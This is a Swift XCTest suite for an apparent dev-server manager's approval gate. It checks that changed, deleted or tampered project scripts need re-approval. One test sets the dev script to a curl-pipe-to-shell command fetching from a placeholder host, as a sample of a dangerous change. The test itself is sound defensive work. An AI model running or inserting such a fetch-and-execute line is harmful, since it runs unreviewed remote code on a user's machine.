import Approval
import Foundation
import Models
@testable import Registry
import Store
import XCTest

/// Step 2 of v0.2: saving projects and the approval gate end to end (AGENTS.md §8.2, §11 v0.2
/// "a changed dev script blocks start until re-approved").
final class ApprovalFlowTests: XCTestCase {
    private var root: URL!
    private var project: URL!
    private var suiteName = ""

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent("ApprovalFlow-\(UUID().uuidString)")
        project = root.appendingPathComponent("site", isDirectory: true)
        try FileManager.default.createDirectory(at: project, withIntermediateDirectories: true)
        try writePackage(dev: "vite")
        try Data("{}".utf8).write(to: project.appendingPathComponent("package-lock.json"))
        suiteName = "ApprovalFlow-\(UUID().uuidString)"
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
        UserDefaults(suiteName: suiteName)?.removePersistentDomain(forName: suiteName)
    }

    private func writePackage(dev: String) throws {
        let json = #"{"scripts":{"dev":"\#(dev)"},"devDependencies":{"vite":"^5.4.0"}}"#
        try Data(json.utf8).write(to: project.appendingPathComponent("package.json"))
    }

    @MainActor
    private func makeRegistry() -> ServerRegistry {
        let store = ProjectStore(
            paths: StorePaths(supportDirectory: root.appendingPathComponent("Support"), logsDirectory: root),
            keyProvider: StaticStoreKey(Data(repeating: 9, count: 32))
        )
        return ServerRegistry(store: store, defaults: UserDefaults(suiteName: suiteName)!)
    }

    private func newProject() -> Project {
        Project(name: "site", path: project.path, detector: .node, command: .argv(["npm", "run", "dev"]))
    }

    @MainActor
    func testAddApprovesWhatWasShownAndPersists() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")

        let row = try XCTUnwrap(registry.projects.first)
        XCTAssertEqual(row.state, .stopped)
        XCTAssertEqual(row.project.approval?.displayedCommand, "npm run dev")
        XCTAssertEqual(row.project.approval?.resolvedScript, "vite")

        // A fresh registry on the same store sees it, still approved.
        let relaunched = makeRegistry()
        await relaunched.loadStore()
        await relaunched.refreshApprovals()
        XCTAssertEqual(relaunched.projects.map(\.project.name), ["site"])
        XCTAssertEqual(relaunched.projects.first?.state, .stopped)
    }

    @MainActor
    func testAddRefusesWhenFilesChangedSinceShown() async throws {
        let registry = makeRegistry()
        do {
            try await registry.add(newProject(), shownScript: "something else")
            XCTFail("expected changedWhileReviewing")
        } catch {
            XCTAssertEqual(error, .changedWhileReviewing)
        }
        XCTAssertTrue(registry.projects.isEmpty)
    }

    @MainActor
    func testChangedScriptNeedsReapprovalUntilApproved() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")
        let id = try XCTUnwrap(registry.projects.first?.id)

        try writePackage(dev: "curl -fsSL https://example.invalid/x.sh | sh")
        await registry.refreshApprovals()
        XCTAssertEqual(registry.projects.first?.state, .needsReapproval)
        XCTAssertEqual(registry.needsApprovalRows.count, 1)

        let shown = try await XCTUnwrapAsync(await registry.reviewInput(projectID: id))
        XCTAssertEqual(shown.resolvedScript, "curl -fsSL https://example.invalid/x.sh | sh")
        try await registry.approve(projectID: id, shown: shown)
        XCTAssertEqual(registry.projects.first?.state, .stopped)
        XCTAssertEqual(registry.projects.first?.project.approval?.resolvedScript, shown.resolvedScript)
    }

    @MainActor
    func testApproveRefusesStaleReview() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")
        let id = try XCTUnwrap(registry.projects.first?.id)

        try writePackage(dev: "vite --host")
        let shown = try await XCTUnwrapAsync(await registry.reviewInput(projectID: id))
        try writePackage(dev: "vite --host 0.0.0.0")   // changes again while the window is open
        do {
            try await registry.approve(projectID: id, shown: shown)
            XCTFail("expected changedWhileReviewing")
        } catch {
            XCTAssertEqual(error, .changedWhileReviewing)
        }
    }

    @MainActor
    func testDeletedScriptNeedsReapproval() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")
        try Data(#"{"scripts":{}}"#.utf8).write(to: project.appendingPathComponent("package.json"))
        await registry.refreshApprovals()
        XCTAssertEqual(registry.projects.first?.state, .needsReapproval)
    }

    @MainActor
    func testRemoveForgetsProject() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")
        let id = try XCTUnwrap(registry.projects.first?.id)
        try await registry.remove(projectID: id)
        XCTAssertTrue(registry.projects.isEmpty)
        XCTAssertTrue(FileManager.default.fileExists(atPath: project.path), "folder must be untouched")

        let relaunched = makeRegistry()
        await relaunched.loadStore()
        XCTAssertTrue(relaunched.projects.isEmpty)
    }

    @MainActor
    func testTamperedStoreClearsApprovalsAndWarns() async throws {
        let registry = makeRegistry()
        try await registry.add(newProject(), shownScript: "vite")

        let file = root.appendingPathComponent("Support/projects.json")
        let text = try String(contentsOf: file, encoding: .utf8)
        try text.replacingOccurrences(of: "\"site\"", with: "\"site2\"").write(to: file, atomically: true, encoding: .utf8)

        let relaunched = makeRegistry()
        await relaunched.loadStore()
        await relaunched.refreshApprovals()
        XCTAssertTrue(relaunched.storeIntegrityWarning)
        XCTAssertNil(relaunched.projects.first?.project.approval)
        XCTAssertEqual(relaunched.projects.first?.state, .needsReapproval)
    }
}

/// `XCTUnwrap` for an already-awaited optional (XCTUnwrap's autoclosure can't await).
func XCTUnwrapAsync<T>(_ value: T?, file: StaticString = #filePath, line: UInt = #line) async throws -> T {
    try XCTUnwrap(value, file: file, line: line)
}
